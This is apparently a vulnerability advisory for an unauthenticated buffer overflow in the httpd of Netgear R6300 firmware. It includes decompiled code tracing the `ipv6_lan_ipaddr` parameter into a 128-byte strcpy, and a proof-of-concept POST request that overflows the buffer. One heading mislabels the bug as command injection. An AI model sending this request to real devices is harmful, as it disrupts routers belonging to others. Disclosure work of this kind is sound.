# Buffer Overflow Vulnerability in `ipv6_lan_ipaddr`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6300 Router                                         |
| Firmware Version     | V1.0.2.80_1.0.59                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`IPv6FixCgiMain` → `acosNvramConfig_set` → `IPv6CgiGetParam`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `ipv6_lan_ipaddr` |

2. Exploitation Path

```c
int __fastcall IPv6FixCgiMain(char *a1, int a2)
{
  ...
  char v12[256]; // [sp+18h] [-100h] BYREF
  ...
  websGetVar(a1, "ipv6_lan_ipaddr", v12);
  if ( !acosNvramConfig_match("ipv6_lan_ipaddr", v12) )
  {
    acosNvramConfig_set("ipv6_lan_ipaddr", v12);
    v4 = 1;
  }
  ...
}

int __fastcall IPv6CgiGetParam(int a1, const char *a2, char *a3)
{
  char v32[128]; // [sp+7Eh] [-182h] BYREF
  ...    
  v13 = (const char *)acosNvramConfig_get("ipv6_lan_ipaddr");
  strcpy(v32, v13);
  ...
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: In the `IPv6FixCgiMain` function at line 6, the call `websGetVar(a1, "ipv6_lan_ipaddr", v12)` retrieves attacker-controlled input. Although a 255-byte restriction is applied by `websGetVar`, no additional validation or sanitization is enforced. The retrieved value is stored via `acosNvramConfig_set("ipv6_lan_ipaddr", v12)` at line 9. Later, in the `IPv6CgiGetParam` function, the stored value is fetched at line 19 through `v13 = (const char *)acosNvramConfig_get("ipv6_lan_ipaddr")` and subsequently copied into the destination buffer `v32` using `strcpy(v32, v13)` at line 20. Since the destination buffer `v32` is only 128 bytes in size, this results in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/IPv6FixCgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

ipv6_lan_ipaddr=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```